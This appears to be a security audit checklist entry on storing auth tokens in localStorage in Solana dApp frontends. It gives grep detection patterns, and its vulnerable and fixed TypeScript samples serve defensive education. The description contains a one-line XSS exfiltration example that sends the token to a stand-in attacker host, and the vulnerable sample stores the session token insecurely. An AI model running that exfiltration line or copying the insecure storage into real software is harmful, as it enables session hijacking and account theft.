# OC-187: Auth Token in localStorage (XSS Accessible)

**Category:** Frontend & Client
**Severity:** HIGH
**Auditors:** FE-01
**CWE:** CWE-922
**OWASP:** A07:2021 - Identification and Authentication Failures

## Description

Storing authentication tokens (JWTs, session tokens, API keys) in localStorage is one of the most pervasive frontend security anti-patterns. Unlike HTTP-only cookies, localStorage values are fully accessible to any JavaScript executing on the page. A single XSS vulnerability -- whether from the application itself, a compromised third-party script, or a malicious browser extension -- gives an attacker immediate access to the auth token, enabling full session hijacking without further interaction.

This pattern is especially dangerous in Solana dApp frontends where authentication often involves Sign-In With Solana (SIWS) tokens or custom JWT sessions tied to wallet signatures. If the resulting session token is stored in localStorage, the cryptographic strength of the wallet signature becomes irrelevant -- the attacker bypasses it entirely by stealing the token via XSS.

The attack is trivial: `fetch('https://evil.com?t=' + localStorage.getItem('token'))`. The stolen token can be replayed from any device, any IP, for the full duration of its validity. Unlike cookie-based sessions, there is no browser-enforced same-site or HTTP-only protection.

## Detection

```
# JWT/token storage in localStorage
grep -rn "localStorage\.setItem.*token\|localStorage\.setItem.*jwt\|localStorage\.setItem.*access" -i --include="*.ts" --include="*.tsx" --include="*.js"

# Reading tokens from localStorage for auth headers
grep -rn "localStorage\.getItem.*token\|localStorage\.getItem.*jwt" -i --include="*.ts" --include="*.tsx"
grep -rn "Authorization.*localStorage\|Bearer.*localStorage" --include="*.ts" --include="*.tsx"

# Common auth library patterns
grep -rn "setToken.*localStorage\|saveToken.*localStorage" --include="*.ts" --include="*.tsx"
```

## Vulnerable Code

```typescript
// Next.js Solana dApp -- storing SIWS session token in localStorage
import { useWallet } from '@solana/wallet-adapter-react';
import bs58 from 'bs58';

async function signInWithSolana(signMessage: (msg: Uint8Array) => Promise<Uint8Array>) {
  const message = new TextEncoder().encode(
    `Sign in to MyDApp\nNonce: ${await fetchNonce()}`
  );
  const signature = await signMessage(message);

  const res = await fetch('/api/auth/siws', {
    method: 'POST',
    body: JSON.stringify({
      message: bs58.encode(message),
      signature: bs58.encode(signature),
    }),
  });

  const { token } = await res.json();

  // VULNERABLE: Token stored in localStorage -- any XSS steals the session
  localStorage.setItem('auth_token', token);
}

// Every API call reads from localStorage
async function fetchPortfolio() {
  const token = localStorage.getItem('auth_token');
  return fetch('/api/portfolio', {
    headers: { Authorization: `Bearer ${token}` },
  });
}
```

## Secure Code

```typescript
// Server sets HttpOnly cookie -- token never touches JavaScript
async function signInWithSolana(signMessage: (msg: Uint8Array) => Promise<Uint8Array>) {
  const message = new TextEncoder().encode(
    `Sign in to MyDApp\nNonce: ${await fetchNonce()}`
  );
  const signature = await signMessage(message);

  // Server responds with Set-Cookie: session=<token>; HttpOnly; Secure; SameSite=Strict
  await fetch('/api/auth/siws', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      message: bs58.encode(message),
      signature: bs58.encode(signature),
    }),
  });
  // No token in JS memory -- cookie is sent automatically
}

async function fetchPortfolio() {
  // HttpOnly cookie sent automatically by browser
  return fetch('/api/portfolio', { credentials: 'include' });
}
```

## Impact

An attacker exploiting any XSS vector on the application can steal the auth token and replay it from their own machine to fully impersonate the user. This enables unauthorized access to user accounts, portfolio data, transaction history, and any privileged operations the token authorizes. The attack persists for the token's entire lifetime, even if the XSS is patched.

## References

- CWE-922: Insecure Storage of Sensitive Information
- OWASP: Session Management Cheat Sheet -- Cookie-based session management
- "Stop Storing JWTs in LocalStorage" -- widespread developer education pattern
- Auth0: Token Storage Best Practices (recommends HttpOnly cookies with CSRF tokens)
- OWASP ASVS V3.5: Token-based Session Management
